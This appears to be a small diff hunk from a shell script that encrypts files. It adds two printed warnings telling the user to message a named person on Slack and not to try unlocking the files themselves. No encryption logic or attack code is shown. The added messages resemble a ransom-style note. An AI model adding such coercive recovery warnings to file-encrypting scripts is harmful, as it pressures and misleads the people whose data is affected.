@@ -40,6 +40,8 @@ main() {
     done
 
     printf "${GREEN}All files have been encrypted.${NC}\n"
+	printf "${GREEN}MESSAGE QUVAN-DE ON SLACK DO NOTT TTRY TO UNLOCK IT YOURSELF!${NC}\n"
+	printf "${RED}I WILL NOT BE LIABLE TO RENOVED FILES IF YOU IGNORED THIS WARNING!!!${NC}\n"
 }
 
 # Call the main function
